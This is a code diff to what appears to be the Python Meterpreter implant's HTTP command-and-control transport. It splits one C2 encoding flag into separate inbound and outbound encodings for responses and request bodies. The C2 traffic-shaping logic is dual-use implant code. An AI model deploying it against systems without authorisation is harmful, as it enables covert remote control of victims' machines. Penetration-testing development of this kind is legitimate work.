@@ -176,7 +176,8 @@ TLV_TYPE_C2_UA                 = TLV_META_TYPE_STRING | 716 # User agent
 TLV_TYPE_C2_CERT_HASH          = TLV_META_TYPE_RAW    | 717 # Expected SSL certificate hash
 TLV_TYPE_C2_PREFIX             = TLV_META_TYPE_RAW    | 718 # Data to prepend to the outgoing payload
 TLV_TYPE_C2_SUFFIX             = TLV_META_TYPE_RAW    | 719 # Data to append to the outgoing payload
-TLV_TYPE_C2_ENC                = TLV_META_TYPE_UINT   | 720 # Request encoding flags (Base64|URL|Base64url)
+TLV_TYPE_C2_ENC_INBOUND        = TLV_META_TYPE_UINT   | 720 # Server->client (response) body encoding
+TLV_TYPE_C2_ENC_OUTBOUND       = TLV_META_TYPE_UINT   | 728 # Client->server (request) body/metadata encoding
 TLV_TYPE_C2_PREFIX_SKIP        = TLV_META_TYPE_UINT   | 721 # Size of prefix to skip (in bytes)
 TLV_TYPE_C2_SUFFIX_SKIP        = TLV_META_TYPE_UINT   | 722 # Size of suffix to skip (in bytes)
 TLV_TYPE_C2_UUID_COOKIE        = TLV_META_TYPE_STRING | 723 # Name of the cookie to put the UUID in
@@ -923,7 +924,8 @@ class Transport(object):
         opts['uri'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_URI).get('value')
         opts['ua'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_UA).get('value')
         opts['headers'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_HEADERS).get('value')
-        opts['enc'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC).get('value', C2_ENCODING_NONE)
+        opts['enc_inbound'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_INBOUND).get('value', C2_ENCODING_NONE)
+        opts['enc_outbound'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_ENC_OUTBOUND).get('value', C2_ENCODING_NONE)
         opts['prefix_skip'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_PREFIX_SKIP).get('value', 0)
         opts['suffix_skip'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_SUFFIX_SKIP).get('value', 0)
         opts['prefix'] = packet_get_tlv(group_bytes, TLV_TYPE_C2_PREFIX).get('value')
@@ -1201,9 +1203,9 @@ class HttpTransport(Transport):
                     suffix_skip = self.c2_get.get('suffix_skip', 0)
                     end = len(raw_response) - suffix_skip if suffix_skip else len(raw_response)
                     raw_response = raw_response[prefix_skip:end]
-                    # c2_get['enc'] is the client metadata/id (request-side)
-                    # encoding; it must NOT decode the response. The response
-                    # transform is the server `output` (prefix/suffix skip).
+                    enc_in = self.c2_get.get('enc_inbound', C2_ENCODING_NONE)
+                    if enc_in != C2_ENCODING_NONE:
+                        raw_response = self._c2_decode(raw_response, enc_in)
 
                 packet = raw_response
                 if len(packet) < PACKET_HEADER_SIZE:
@@ -1235,7 +1237,7 @@ class HttpTransport(Transport):
             url = self._build_request_url(self.c2_post, uuid)
             headers = self._build_request_headers(self.c2_post, uuid)
             # Encode the packet based on C2 profile encoding flags
-            body = self._c2_encode(packet, self.c2_post.get('enc', C2_ENCODING_NONE))
+            body = self._c2_encode(packet, self.c2_post.get('enc_outbound', C2_ENCODING_NONE))
             # Wrap with prefix/suffix
             prefix = self.c2_post.get('prefix') or b''
             suffix = self.c2_post.get('suffix') or b''
